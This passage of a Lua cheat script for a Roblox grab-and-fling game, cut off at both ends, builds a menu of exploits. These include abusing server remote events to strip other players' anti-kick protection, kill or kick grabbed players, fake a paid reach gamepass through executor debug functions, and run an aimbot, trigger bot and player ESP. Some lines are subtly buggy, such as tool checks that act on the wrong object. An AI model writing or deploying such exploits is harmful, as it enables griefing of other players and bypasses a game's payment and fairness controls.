                if not (part1 and part2) then return math.huge end
                return (part1.Position - part2.Position).Magnitude
            end

            if selectedAntiMode == "Anti-AntiKick CLICK" then
                antiTask = task.spawn(function()
                    while antiActive do
                        task.wait()
                        local TargetPLR = typeof(selectedKickPlayer) == "Instance" and selectedKickPlayer or (selectedKickPlayer and Players:FindFirstChild(tostring(selectedKickPlayer)))
                        if not TargetPLR then continue end 
                        
                        local TargetInv = workspace:FindFirstChild(TargetPLR.Name .. "SpawnedInToys")
                        if not TargetInv then continue end

                        local Root = TargetPLR.Character and TargetPLR.Character:FindFirstChild("HumanoidRootPart")
                        local FirePlayerPart = Root and Root:FindFirstChild("FirePlayerPart")
                        
                        if not FirePlayerPart then continue end

                        for _, v in pairs(TargetInv:GetChildren()) do 
                            local StickyPart = v:FindFirstChild("StickyPart")
                            if StickyPart then 
                                if StickyPart.CanQuery then 
                                    task.spawn(function()
                                        for _, part in pairs(v:GetChildren()) do  
                                            if part:IsA("BasePart") then  
                                                part.CanCollide = false 
                                                part.CanTouch = false 
                                                part.CanQuery = false
                                            end
                                        end
                                    end)
                                end
                                
                                if not CheckNetworkOwnerOnPart(StickyPart) then 
                                    sno(StickyPart)
                                end
                            end
                        end
                    end
                end)

            elseif selectedAntiMode == "Anti-AntiKick BYPASS" then
                antiTask = task.spawn(function()
                    while antiActive do
                        task.wait()
                        local TargetPLR = typeof(selectedKickPlayer) == "Instance" and selectedKickPlayer or (selectedKickPlayer and Players:FindFirstChild(tostring(selectedKickPlayer)))
                        if not TargetPLR then continue end
                        
                        local TargetInv = workspace:FindFirstChild(TargetPLR.Name .. "SpawnedInToys")
                        if not TargetInv then continue end

                        local Root = TargetPLR.Character and TargetPLR.Character:FindFirstChild("HumanoidRootPart")
                        local FirePlayerPart = Root and Root:FindFirstChild("FirePlayerPart")
                        
                        if not FirePlayerPart then continue end

                        local myChar = LocalPlayer.Character
                        local myHRP = myChar and myChar:FindFirstChild("HumanoidRootPart")
                        local myFirePart = myHRP and myHRP:FindFirstChild("FirePlayerPart")

                        for _, v in pairs(TargetInv:GetChildren()) do 
                            local StickyPart = v:FindFirstChild("StickyPart")
                            if StickyPart then 
                                local StickyWeld = StickyPart:FindFirstChild("StickyWeld")
                                if not StickyWeld then continue end 
                                
                                if StickyPart.CanQuery then 
                                    task.spawn(function()
                                        for _, part in pairs(v:GetChildren()) do  
                                            if part:IsA("BasePart") then  
                                                part.CanCollide = false 
                                                part.CanTouch = false 
                                                part.CanQuery = false
                                            end
                                        end
                                    end)
                                end
                                
                                if myFirePart and StickyWeld.Part1 == myFirePart and GetMagnitude(FirePlayerPart, StickyPart) > 7 then 
                                    continue 
                                elseif not CheckNetworkOwnerOnPart(StickyPart) then 
                                    sno(StickyPart)
                                else
                                    if StickyEvent then
                                        pcall(function()
                                            StickyEvent:FireServer(
                                                StickyPart,
                                                FirePlayerPart,
                                                CFrame.new(0, -10, 5)
                                            )
                                        end)
                                    end
                                end
                            end
                        end
                    end
                end)
            end
        end
    })
end


TargetGroup:CreateToggle({
	Name = "Remove Anti Kick",
        Flag = "Remove Anti Kick",
	Default = false,
	Callback = function(Value)
        SetToggleState("Remove Anti Kick", Value)
		antiAntiKickActive = Value
		if Value then
			task.spawn(function()
				local SetNetOwner = game:GetService("ReplicatedStorage").GrabEvents.SetNetworkOwner
				local LocalPlayer = game.Players.LocalPlayer
				function invis_touch(part, cf)
					SetNetOwner:FireServer(part, cf)
				end
				function CheckAndYeet(toy)
					local part = toy:FindFirstChild("SoundPart")
					if part then
						invis_touch(part, part.CFrame)
						if part:FindFirstChild("PartOwner") and part.PartOwner.Value == LocalPlayer.Name then
							part.CFrame = CFrame.new(0, 1000, 0)
						end
					end
				end
				while antiAntiKickActive do
					local target = selectedKickPlayer
					if target then
						local spawned = workspace:FindFirstChild(target.Name .. "SpawnedInToys")
						if spawned then
							if spawned:FindFirstChild("NinjaKunai") then
								CheckAndYeet(spawned.NinjaKunai)
							end
							if spawned:FindFirstChild("NinjaShuriken") then
								CheckAndYeet(spawned.NinjaShuriken)
							end
							if spawned:FindFirstChild("AntiKick") then
								CheckAndYeet(spawned.AntiKick)
							end
							if spawned:FindFirstChild("ToolPickaxe") then
								CheckAndYeet(spawned.AntiKick)
							end
							if spawned:FindFirstChild("ToolPencil") then
								CheckAndYeet(spawned.AntiKick)
							end
							if spawned:FindFirstChild("ToolDiggingForkRusty") then
								CheckAndYeet(spawned.AntiKick)
							end
							if spawned:FindFirstChild("ToolCleaver") then
								CheckAndYeet(spawned.AntiKick)
							end
						end
					end
					task.wait(0.1)
				end
			end)
		else
			antiAntiKickActive = false
		end
	end
})

local GrabGroup = Tabs.Grab:CreateBlock({Name = "Grab Customization", Side = "Left"})

_G.strength = 750
local strengthConnection
GrabGroup:CreateSlider({
	Name = "Power",
        Flag = "Power",
	Default = 750,
	Min = 1,
	Max = 20000,
	Rounding = 0,
	Callback = function(value)
		_G.strength = value
	end
})
GrabGroup:CreateToggle({
	Name = "Strength",
        Flag = "Strength",
	Default = false,
	Callback = function(enabled)
        SetToggleState("Strength", Value)
		if enabled then
			strengthConnection = workspace.ChildAdded:Connect(function(model)
				if model.Name == "GrabParts" then
					local partToImpulse = model.GrabPart.WeldConstraint.Part1
					if partToImpulse then
						local velocityObj = Instance.new("BodyVelocity", partToImpulse)
						model:GetPropertyChangedSignal("Parent"):Connect(function()
							if not model.Parent then
								if UserInputService:GetLastInputType() == Enum.UserInputType.MouseButton2 then
									velocityObj.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
									velocityObj.Velocity = workspace.CurrentCamera.CFrame.LookVector * _G.strength
									game:GetService("Debris"):AddItem(velocityObj, 1)
								else
									velocityObj:Destroy()
								end
							end
						end)
					end
				end
			end)
		elseif strengthConnection then
			strengthConnection:Disconnect()
		end
	end
})
local killGrabEnabled = false
local function killGrabFunction()
	workspace.ChildAdded:Connect(function(v)
		if v:IsA("Model") and v.Name == "GrabParts" and killGrabEnabled then
			task.wait(0.05)
			local grabPart = v:FindFirstChild("GrabPart")
			if grabPart and grabPart:FindFirstChild("WeldConstraint") then
				local part1 = grabPart.WeldConstraint.Part1
				if part1 and part1.Parent and part1.Parent ~= Player.Character then
					local targetChar = part1.Parent
					local targetHum = targetChar:FindFirstChildOfClass("Humanoid")
					if targetHum and targetChar then
						pcall(function()
							targetHum.Health = 0
							targetChar:BreakJoints()
						end)
					end
				end
			end
		end
	end)
end

killGrabFunction()
GrabGroup:CreateToggle({
	Name = "Kill Grab",
        Flag = "Kill Grab",
	Default = false,
	Callback = function(Value)
        SetToggleState("Kill Grab", Value)
		killGrabEnabled = Value
	end
})

GrabGroup:CreateToggle({
        Name = "Kick Grab",
        Default = false,
        Callback = function(state)
            if not state then
                getgenv().KickGrabActive = false
                getgenv().FKeyAttackActive = false
                if getgenv().FKeyInputConnection then
                    getgenv().FKeyInputConnection:Disconnect()
                    getgenv().FKeyInputConnection = nil
                end
                return
            end
            if getgenv().KickGrabActive then return end

            getgenv().KickGrabActive = true
            getgenv().FKeyAttackActive = false

            local GrabEvents = ReplicatedStorage:WaitForChild('GrabEvents')
            local CreateGrabLine = GrabEvents:WaitForChild('CreateGrabLine')
            local SetNetworkOwner = GrabEvents:WaitForChild('SetNetworkOwner')
            local DestroyGrabLine = GrabEvents:WaitForChild('DestroyGrabLine')

            task.spawn(function()
                while getgenv().KickGrabActive do
                    local grabParts = workspace:FindFirstChild('GrabParts')
                    if not grabParts then task.wait() continue end

                    local gp = grabParts:FindFirstChild('GrabPart')
                    local weld = gp and gp:FindFirstChildOfClass('WeldConstraint')
                    local part1 = weld and weld.Part1

                    if part1 then
                        local ownerPlayer = nil
                        for _, pl in ipairs(Players:GetPlayers()) do
                            if pl.Character and part1:IsDescendantOf(pl.Character) then
                                ownerPlayer = pl
                                break
                            end
                        end

                        if not ownerPlayer then task.wait() continue end

                        while getgenv().KickGrabActive and workspace:FindFirstChild('GrabParts') do
                            if ownerPlayer then
                                local tgtTorso = ownerPlayer.Character and ownerPlayer.Character:FindFirstChild('HumanoidRootPart')
                                local tgtHead = ownerPlayer.Character and ownerPlayer.Character:FindFirstChild('Head')
                                local myTorso = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild('HumanoidRootPart')

                                if tgtTorso and myTorso and tgtHead then
                                    pcall(function()
                                        SetNetworkOwner:FireServer(tgtTorso, CFrame.lookAt(myTorso.Position, tgtTorso.Position))
                                    end)
                                    task.wait()
                                    pcall(function()
                                        DestroyGrabLine:FireServer(tgtHead)
                                    end)
                                end
                            end
                            task.wait()
                        end
                    end
                    task.wait()
                end
            end)

            function getScreenCenterTarget()
                local screenCenter = Vector2.new(workspace.CurrentCamera.ViewportSize.X / 2, workspace.CurrentCamera.ViewportSize.Y / 2)
                local ray = workspace.CurrentCamera:ViewportPointToRay(screenCenter.X, screenCenter.Y)
                local raycastParams = RaycastParams.new()
                raycastParams.FilterType = Enum.RaycastFilterType.Exclude
                if LocalPlayer.Character then
                    raycastParams.FilterDescendantsInstances = {LocalPlayer.Character}
                end

                local result = workspace:Raycast(ray.Origin, ray.Direction * 1000, raycastParams)
                if result and result.Instance then
                    for _, pl in ipairs(Players:GetPlayers()) do
                        if pl ~= LocalPlayer and pl.Character and result.Instance:IsDescendantOf(pl.Character) then
                            return pl
                        end
                    end
                end
                return nil
            end

            local fAttackTarget = nil
            local fAttackConnection = nil

            function stopFKeyAttack()
                getgenv().FKeyAttackActive = false
                fAttackTarget = nil
                if fAttackConnection then
                    fAttackConnection:Disconnect()
                    fAttackConnection = nil
                end
            end

            function startFKeyAttack(targetPlayer)
                getgenv().FKeyAttackActive = true
                fAttackTarget = targetPlayer
                fAttackConnection = RunService.RenderStepped:Connect(function()
                    if not getgenv().FKeyAttackActive or not fAttackTarget then
                        stopFKeyAttack()
                        return
                    end

                    local myChar = LocalPlayer.Character
                    local myRoot = myChar and myChar:FindFirstChild('HumanoidRootPart')
                    local tgtChar = fAttackTarget.Character
                    local tgtRoot = tgtChar and tgtChar:FindFirstChild('HumanoidRootPart')

                    if not myRoot or not tgtRoot then return end

                    local camCF = workspace.CurrentCamera.CFrame
                    local teleportPos = camCF.Position + camCF.LookVector * 20

                    pcall(function()
                        tgtRoot.CFrame = CFrame.new(teleportPos)
                    end)

                    local grabCFrame = CFrame.new(-9.0301513671875E-2, 0.4190945625305176, 0.4999980926513672, 0.39632707834243774, 0, -0.9181094169616699, -1.0944717132588266E-7, 1, -4.7245869438938826E-8, 0.9181094169616699, 5.9604644775390625e-8, 0.39632707834243774)

                    pcall(function()
                        CreateGrabLine:FireServer(tgtRoot, grabCFrame)
                        SetNetworkOwner:FireServer(tgtRoot, CFrame.lookAt(myRoot.Position, tgtRoot.Position))
                        DestroyGrabLine:FireServer(tgtRoot)
                    end)
                end)
            end

            getgenv().FKeyInputConnection = UserInputService.InputBegan:Connect(function(input, gameProcessed)
                if gameProcessed then return end
                if input.KeyCode ~= Enum.KeyCode.F then return end
                if getgenv().FKeyAttackActive then
                    stopFKeyAttack()
                    return
                end

                local target = getScreenCenterTarget()
                if not target then return end

                local myChar = LocalPlayer.Character
                local myRoot = myChar and myChar:FindFirstChild('HumanoidRootPart')
                local tgtChar = target.Character
                local tgtRoot = tgtChar and tgtChar:FindFirstChild('HumanoidRootPart')

                if not myRoot or not tgtRoot then return end

                local distance = (myRoot.Position - tgtRoot.Position).Magnitude
                if distance > 25 then return end

                startFKeyAttack(target)
            end)

            if game.PlaceId == 6961824067 then
                local G = ReplicatedStorage:WaitForChild('GrabEvents')
                G:WaitForChild('EndGrabEarly'):Destroy()
                Instance.new('RemoteEvent', G).Name = 'EndGrabEarly'
            end
        end
    })


GrabGroup:CreateToggle({
	Name = "MassLess Grab",
        Flag = "MassLess Grab",
	Default = false,
	Callback = function(Value)
        SetToggleState("MassLess Grab", Value)
		_G.MassLessGrab = Value
		if not _G.MassLessGrab then
			if _G.MLConn then
				_G.MLConn:Disconnect()
				_G.MLConn = nil
			end
			return
		end
		if _G.MLConn then
			_G.MLConn:Disconnect()
			_G.MLConn = nil
		end
		_G.MLSense = _G.MLSense or 200
		_G.MLConn = game:GetService("RunService").Heartbeat:Connect(function()
			if not _G.MassLessGrab then
				return
			end
			local gp = workspace:FindFirstChild("GrabParts")
			if not gp then
				return
			end
			local dp = gp:FindFirstChild("DragPart")
			if not dp then
				return
			end
			local ap = dp:FindFirstChild("AlignPosition")
			local ao = dp:FindFirstChild("AlignOrientation")
			if ap then
				ap.Responsiveness = _G.MLSense
				ap.MaxForce = math.huge
				ap.MaxVelocity = math.huge
			end
			if ao then
				ao.Responsiveness = _G.MLSense
				ao.MaxTorque = math.huge
			end
		end)
	end
})


local PanelAssist = Tabs.Grab:CreateBlock({Name = "Gamepass", Side = "Left"})

do

    PanelAssist:CreateToggle({
        Name = "Free Gamepass",
        Tooltip = "Gives you 30 studs of reach instantly",
        Default = false,
        Callback = function(state)
            if state then
                local Reach = Instance.new("BoolValue")
                Reach.Name = "FartherReach"
                Reach.Parent = game.Players.LocalPlayer
                Reach.Value = true

                local Notifier = game.ReplicatedStorage.GamepassEvents:FindFirstChild("FurtherReachBoughtNotifier")
                if Notifier then
                    for _, connection in ipairs(getconnections(Notifier.OnClientEvent)) do
                        pcall(connection.Function)
                    end
                end
            else
                local Reach = game.Players.LocalPlayer:FindFirstChild("FartherReach")
                if Reach then
                    Reach:Destroy()
                end
            end
        end
    })

    local GrabReachEnabled = false
    local GrabReachDist = 25

    function ApplyGrabReach(range)
        GrabReachDist = range
        pcall(function()
            local RS = game:GetService("ReplicatedStorage")
            local DataEvents = RS:FindFirstChild("DataEvents")
            if DataEvents then
                DataEvents.UpdateLineColorsEvent:FireServer(ColorSequence.new({
                    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 0, 0)),
                    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 255, 195)),
                }))
            end
        end)
        pcall(function()
            local RS = game:GetService("ReplicatedStorage")
            local GamepassEvents = RS:FindFirstChild("GamepassEvents")
            if GamepassEvents then
                local Notifier = GamepassEvents:FindFirstChild("FurtherReachBoughtNotifier")
                if Notifier then
                    for _, conn in pairs(getconnections(Notifier.OnClientEvent)) do
                        for i in debug.getupvalues(conn.Function) do
                            debug.setupvalue(conn.Function, i, range)
                        end
                    end
                end
            end
        end)
    end

    PanelAssist:CreateToggle({
        Name = "Further Reach",
        Tooltip = "Extends your grab distance beyond default",
        Default = false,
        Callback = function(v)
            GrabReachEnabled = v
            if v then
                ApplyGrabReach(GrabReachDist)
            else
                ApplyGrabReach(25)
            end
        end
    })

    PanelAssist:CreateSlider({
        Name = "Reach Distance",
        Default = 25,
        Min = 25,
        Max = 45,
        Callback = function(v)
            GrabReachDist = v
            if GrabReachEnabled then
                ApplyGrabReach(v)
            end
        end
    })
end

local TbotGroup = Tabs.Grab:CreateBlock({Name = "Trigger Bot", Side = "Left"})
local AimGroup = Tabs.Grab:CreateBlock({Name = "Aimbot", Side = "Right"})

do

    local triggerEnabled = false
    local triggerDistance = 25
    local triggerDelay = 0.05

    local function getTargetsInRange()
        local targets = {}
        local char = LocalPlayer.Character
        local root = char and char:FindFirstChild("HumanoidRootPart")
        if not root then return targets end

        for _, plr in pairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer and plr.Character then
                local tRoot = plr.Character:FindFirstChild("HumanoidRootPart")
                local tHum = plr.Character:FindFirstChild("Humanoid")
                if tRoot and tHum and tHum.Health > 0 then
                    local dist = (tRoot.Position - root.Position).Magnitude
                    if dist <= triggerDistance then
                        table.insert(targets, plr)
                    end
                end
            end
        end
        return targets
    end

    local function triggerBot()
        if not triggerEnabled then return end
        
        local targets = getTargetsInRange()
        if #targets == 0 then return end

        local cam = workspace.CurrentCamera
        local center = Vector2.new(cam.ViewportSize.X / 2, cam.ViewportSize.Y / 2)
        local closestTarget = nil
        local closestDist = math.huge

        for _, plr in ipairs(targets) do
            local tRoot = plr.Character:FindFirstChild("HumanoidRootPart")
            if tRoot then
                local screenPos, onScreen = cam:WorldToViewportPoint(tRoot.Position)
                if onScreen then
                    local screenDist = (Vector2.new(screenPos.X, screenPos.Y) - center).Magnitude
                    if screenDist < closestDist then
                        closestDist = screenDist
                        closestTarget = plr
                    end
                end
            end
        end

        if closestTarget then
            pcall(function()
                mouse1press()
                task.wait(0.05)
                mouse1release()
            end)
        end
    end

    TbotGroup:CreateToggle({
        Name = "Trigger Bot",
        Default = false,
        Callback = function(v)
            triggerEnabled = v
            if v then
                task.spawn(function()
                    while triggerEnabled do
                        triggerBot()
                        task.wait(triggerDelay)
                    end
                end)
            end
        end
    })

    TbotGroup:CreateSlider({
        Name = "Trigger Distance",
        Default = 25,
        Min = 5,
        Max = 50,
        Callback = function(v)
            triggerDistance = v
        end
    })

    TbotGroup:CreateSlider({
        Name = "Trigger Delay",
        Default = 0.05,
        Min = 0.01,
        Max = 0.5,
        Callback = function(v)
            triggerDelay = v
        end
    })
end

do

    local aimbotEnabled = false
    local aimbotDistance = 30
    local aimbotSmoothness = 0.5
    local aimbotFOV = 100
    local aimbotPart = "Head"
    local aimbotKey = Enum.KeyCode.Q

    local function getClosestTarget()
        local char = LocalPlayer.Character
        local root = char and char:FindFirstChild("HumanoidRootPart")
        if not root then return nil end

        local cam = workspace.CurrentCamera
        local center = Vector2.new(cam.ViewportSize.X / 2, cam.ViewportSize.Y / 2)
        local closestTarget = nil
        local closestScreenDist = math.huge

        for _, plr in pairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer and plr.Character then
                local tPart = plr.Character:FindFirstChild(aimbotPart)
                local tHum = plr.Character:FindFirstChild("Humanoid")
                if tPart and tHum and tHum.Health > 0 then
                    local dist = (tPart.Position - root.Position).Magnitude
                    if dist <= aimbotDistance then
                        local screenPos, onScreen = cam:WorldToViewportPoint(tPart.Position)
                        if onScreen then
                            local screenDist = (Vector2.new(screenPos.X, screenPos.Y) - center).Magnitude
                            if screenDist <= aimbotFOV and screenDist < closestScreenDist then
                                closestScreenDist = screenDist
                                closestTarget = plr
                            end
                        end
                    end
                end
            end
        end
        return closestTarget
    end

    local function aimAtTarget(target)
        if not target or not target.Character then return end
        local tPart = target.Character:FindFirstChild(aimbotPart)
        if not tPart then return end
        
        local cam = workspace.CurrentCamera
        local currentCF = cam.CFrame
        local targetPos = tPart.Position
        
        local lookAtCF = CFrame.lookAt(currentCF.Position, targetPos)
        local newCF = currentCF:Lerp(lookAtCF, aimbotSmoothness)
        cam.CFrame = newCF
    end

    local function aimbotLoop()
        while aimbotEnabled do
            local target = getClosestTarget()
            if target then
                aimAtTarget(target)
            end
            task.wait()
        end
    end

    AimGroup:CreateToggle({
        Name = "Enable Aimbot",
        Default = false,
        Callback = function(v)
            aimbotEnabled = v
            if v then
                task.spawn(aimbotLoop)
            end
        end
    })

    AimGroup:CreateSlider({
        Name = "Aimbot Distance",
        Default = 30,
        Min = 5,
        Max = 100,
        Callback = function(v)
            aimbotDistance = v
        end
    })

    AimGroup:CreateSlider({
        Name = "Aimbot Smoothness",
        Default = 0.5,
        Min = 0.1,
        Max = 1,
        Callback = function(v)
            aimbotSmoothness = v
        end
    })

    AimGroup:CreateSlider({
        Name = "Aimbot FOV",
        Default = 100,
        Min = 10,
        Max = 360,
        Callback = function(v)
            aimbotFOV = v
        end
    })

    AimGroup:CreateDropdown({
        Name = "Aim Part",
        Items = {"Head", "HumanoidRootPart", "Torso"},
        Default = "Head",
        Callback = function(v)
            aimbotPart = v
        end
    })
end



local VisL = Tabs.Player:CreateBlock({Name = "View & Movement", Side = "Left"})
local VisualR = Tabs.Player:CreateBlock({Name = "Notify", Side = "Right"})

KB_THRESHOLD = 10
BYTE_THRESHOLD = KB_THRESHOLD * 1024
COOLDOWN = 30
lastNotify = 0
connections = {}

function resolveSender(args)
    for _, v in ipairs(args) do
        if typeof(v) == "Instance" and v:IsA("Player") then return v end
        if typeof(v) == "Instance" and v:IsA("Model") then
            local plr = Players:GetPlayerFromCharacter(v)
            if plr then return plr end
        end
        if typeof(v) == "Instance" and v:IsA("BasePart") then
            local model = v:FindFirstAncestorOfClass("Model")
            if model then
                local plr = Players:GetPlayerFromCharacter(model)
                if plr then return plr end
            end
        end
    end
    return LocalPlayer
end

function shortenString(str)
    if #str <= 80 then return str end
    return str:sub(1, 80) .. "... (+" .. (#str - 80) .. " chars)"
end

function summarizeTable(tbl)
    local preview = {}
    local count = 0
    for _, v in pairs(tbl) do
        count = count + 1
        if count <= 5 then table.insert(preview, tostring(v)) end
    end
    return "table["..count.."] { "..table.concat(preview, ", ").." ... }"
end

 function compressArgs(args)
    local seen = {}
    local summary = {}
    for _, v in ipairs(args) do
        local key
        if typeof(v) == "string" then key = "str:"..shortenString(v)
        elseif typeof(v) == "Instance" then key = "inst:"..v.ClassName.."("..v.Name..")"
        elseif typeof(v) == "table" then key = "tbl:"..summarizeTable(v)
        else key = typeof(v)..":"..tostring(v) end
        seen[key] = (seen[key] or 0) + 1
    end
    for k, count in pairs(seen) do
        if count > 1 then table.insert(summary, k.." x"..count)
        else table.insert(summary, k) end
    end
    return summary
end

 function handleEvent(eventType, remoteName, ...)
    local args = {...}
    local totalBytes = 0
    for _, v in ipairs(args) do
        if typeof(v) == "string" then totalBytes = totalBytes + #v end
    end
    if totalBytes < BYTE_THRESHOLD then return end
    if tick() - lastNotify < COOLDOWN then return end
    lastNotify = tick()
    local sender = resolveSender(args)
    local senderName = sender.DisplayName
    if sender == LocalPlayer then senderName = senderName .. " (You)" end
    local mbSize = totalBytes / (1024 * 1024)
    local summarized = compressArgs(args)
   
    notify(string.format("[%s] %s", eventType, remoteName), string.format("Player: %s\nSize: %.3f MB\nArgs:\n%s", senderName, mbSize, table.concat(summarized, "\n")), 7)
end

function scanForBlobRemotes(parent)
    for _, child in ipairs(parent:GetChildren()) do
        if child:IsA("RemoteEvent") and child.Name == "RelayClientAnimation" and child.Parent and child.Parent.Name == "BlobmanAnimations" then
            table.insert(connections, child.OnClientEvent:Connect(function(...) handleEvent("Blob", child.Parent.Parent.Name, ...) end))
        end
        scanForBlobRemotes(child)
    end
end

function watchChildren(parent)
    table.insert(connections, parent.ChildAdded:Connect(function(child)
        scanForBlobRemotes(child)
        watchChildren(child)
    end))
    for _, child in ipairs(parent:GetChildren()) do watchChildren(child) end
end

function startDetector()
    if #connections > 0 then return end
    local GrabRemoteDetect = ReplicatedStorage:WaitForChild("GrabEvents"):WaitForChild("ExtendGrabLine")
    table.insert(connections, GrabRemoteDetect.OnClientEvent:Connect(function(...) handleEvent("Grab", "ExtendGrabLine", ...) end))
    scanForBlobRemotes(workspace)
    watchChildren(workspace)
end

function stopDetector()
    for _, conn in ipairs(connections) do conn:Disconnect() end
    connections = {}
end

    VisualR:CreateToggle({
        Name = "Packet Notify",
        Flag = "GrabRemoteDetector",
        Default = false,
        Callback = function(Value)
        if Value then startDetector()
        else stopDetector() end
    end,
})

    -- Third Person
    do
        plr = game.Players.LocalPlayer
        VisL:CreateToggle({
            Name = "Third Person",
            Default = false,
            Callback = function(Value)
                if Value then
                    plr.CameraMode = Enum.CameraMode.Classic
                    plr.CameraMaxZoomDistance = 1000
                    plr.CameraMinZoomDistance = 0.5
                else
                    plr.CameraMode = Enum.CameraMode.LockFirstPerson
                    plr.CameraMaxZoomDistance = 0.5
                    plr.CameraMinZoomDistance = 0.5
                end
            end
        })
    end

    -- FOV Slider
    VisL:CreateSlider({
        Name = "Field of View",
        Min = 40,
        Max = 120,
        Default = 70,
        Callback = function(Value)
            local cam = workspace.CurrentCamera
            if cam then
                cam.FieldOfView = Value
            end
        end
    })

    -- Player ESP
    do
        espEnabled = false
        espColor = Color3.fromRGB(0, 255, 255)
        rainbowEnabled = false
        espConnections = {}
        espObjects = {}
        
        function createESP(player)
            if not player or not player.Character then return end
            
            local char = player.Character
            local hrp = char:FindFirstChild("HumanoidRootPart")
            if not hrp then return end
            
            local highlight = Instance.new("Highlight")
            highlight.Name = "ESP_Highlight"
            highlight.Adornee = char
            highlight.FillColor = espColor
            highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
            highlight.FillTransparency = 0.4
            highlight.OutlineTransparency = 0
            highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
            highlight.Parent = char
            
            local billboard = Instance.new("BillboardGui")
            billboard.Name = "ESP_Name"
            billboard.Adornee = hrp
            billboard.Size = UDim2.new(0, 200, 0, 30)
            billboard.StudsOffset = Vector3.new(0, 3, 0)
            billboard.AlwaysOnTop = true
            billboard.Parent = hrp
            
            local label = Instance.new("TextLabel")
            label.Size = UDim2.new(1, 0, 1, 0)
            label.BackgroundTransparency = 1
            label.Text = player.DisplayName .. " (" .. player.Name .. ")"
            label.TextColor3 = Color3.fromRGB(255, 255, 255)
            label.TextStrokeTransparency = 0
            label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
            label.Font = Enum.Font.GothamBold
            label.TextScaled = true
            label.Parent = billboard
            
            local distBillboard = Instance.new("BillboardGui")
            distBillboard.Name = "ESP_Distance"
            distBillboard.Adornee = hrp
            distBillboard.Size = UDim2.new(0, 100, 0, 20)
            distBillboard.StudsOffset = Vector3.new(0, -2, 0)
            distBillboard.AlwaysOnTop = true
            distBillboard.Parent = hrp
            
            local distLabel = Instance.new("TextLabel")
            distLabel.Size = UDim2.new(1, 0, 1, 0)
            distLabel.BackgroundTransparency = 1
            distLabel.Text = "0 studs"
            distLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
            distLabel.TextStrokeTransparency = 0
            distLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
            distLabel.Font = Enum.Font.GothamBold
            distLabel.TextScaled = true
            distLabel.Parent = distBillboard
            
            table.insert(espObjects, {
                player = player,
                highlight = highlight,
                billboard = billboard,
                distBillboard = distBillboard,
                label = label,
                distLabel = distLabel
            })
            
            local conn = RunService.RenderStepped:Connect(function()
                if not espEnabled or not player.Character then
                    conn:Disconnect()
                    return
                end
                
                local localChar = LocalPlayer.Character
                local localHrp = localChar and localChar:FindFirstChild("HumanoidRootPart")
                if localHrp and hrp and hrp.Parent then
                    local dist = math.floor((hrp.Position - localHrp.Position).Magnitude)
                    distLabel.Text = dist .. " studs"
                end
            end)
            table.insert(espConnections, conn)
        end
        
        function clearESP()
            for _, conn in ipairs(espConnections) do
                pcall(function() conn:Disconnect() end)
            end
            espConnections = {}
            
            for _, obj in ipairs(espObjects) do
                pcall(function()
                    if obj.highlight then obj.highlight:Destroy() end
                    if obj.billboard then obj.billboard:Destroy() end
                    if obj.distBillboard then obj.distBillboard:Destroy() end
                end)
            end
            espObjects = {}
        end
        
        function updateAllESP()
            clearESP()
            if not espEnabled then return end
            
            for _, plr in pairs(Players:GetPlayers()) do
                if plr ~= LocalPlayer and plr.Character then
                    createESP(plr)
                end
            end
        end
        
        function updateColors()
            for _, obj in ipairs(espObjects) do
                pcall(function()
                    if obj.highlight then
                        obj.highlight.FillColor = espColor
                    end
                end)
            end
        end
        
        VisL:CreateToggle({
            Name = "Rainbow ESP",
            Default = false,
            Callback = function(Value)
                rainbowEnabled = Value
                if Value then
                    task.spawn(function()
                        while rainbowEnabled and espEnabled do
                            local hue = tick() % 1
                            espColor = Color3.fromHSV(hue, 1, 1)
                            updateColors()
                            task.wait(0.05)
                        end
                    end)
                else
                    espColor = Color3.fromRGB(0, 255, 255)
                    updateColors()
                end
            end
        })
        
        VisL:CreateToggle({
            Name = "Enable Player ESP",
            Default = false,
            Callback = function(Value)
                espEnabled = Value
                if Value then
                    updateAllESP()
                    
                    local playerAddedConn = Players.PlayerAdded:Connect(function(plr)
                        task.wait(0.5)
                        if espEnabled and plr ~= LocalPlayer and plr.Character then
                            createESP(plr)
                        end
                    end)
                    table.insert(espConnections, playerAddedConn)
                    
                    local charAddedConn = Players.PlayerAdded:Connect(function(plr)
                        if espEnabled and plr ~= LocalPlayer then
                            local charConn = plr.CharacterAdded:Connect(function()
                                task.wait(0.5)
                                if espEnabled and plr.Character then
                                    local exists = false
                                    for _, obj in ipairs(espObjects) do
                                        if obj.player == plr then
                                            exists = true
                                            break
                                        end
                                    end
                                    if not exists then
                                        createESP(plr)
                                    end
                                end
                            end)
                            table.insert(espConnections, charConn)
                        end
                    end)
                    table.insert(espConnections, charAddedConn)
                else
                    clearESP()
                end
            end
        })
        
        Players.PlayerRemoving:Connect(function(plr)
            for i, obj in ipairs(espObjects) do
                if obj.player == plr then
                    pcall(function()
                        if obj.highlight then obj.highlight:Destroy() end
                        if obj.billboard then obj.billboard:Destroy() end
                        if obj.distBillboard then obj.distBillboard:Destroy() end
                    end)
                    table.remove(espObjects, i)
                    break
                end
            end
        end)
    end

    -- PCLD ESP (Box)
    do
        pcldEnabled = false
        pcldBoxes = {}
        pcldColor = Color3.fromRGB(0, 255, 255)
        pcldRainbow = false
        pcldConnections = {}

        local targetNames = {"partesp", "playercharacterlocationdetector"}

        function IsTarget(obj)
            if not obj:IsA("BasePart") then
                return false
            end
            for _, name in ipairs(targetNames) do
                if string.lower(obj.Name) == string.lower(name) then
                    return true
                end
            end
            return false
        end

        function AddBoxESP(obj)
            if pcldBoxes[obj] then
                return
            end
            local box = Instance.new("BoxHandleAdornment")
            box.Adornee = obj
            box.AlwaysOnTop = true
            box.ZIndex = 5
            box.Color3 = pcldColor
            box.Transparency = 0.3
            box.Size = obj.Size
            box.Parent = game.CoreGui
            pcldBoxes[obj] = box
            
            local conn = obj.AncestryChanged:Connect(function(_, parent)
                if not parent and pcldBoxes[obj] then
                    if pcldBoxes[obj] then
                        pcldBoxes[obj]:Destroy()
                    end
                    pcldBoxes[obj] = nil
                end
            end)
            table.insert(pcldConnections, conn)
        end

        function RemoveAllBoxes()
            for obj, box in pairs(pcldBoxes) do
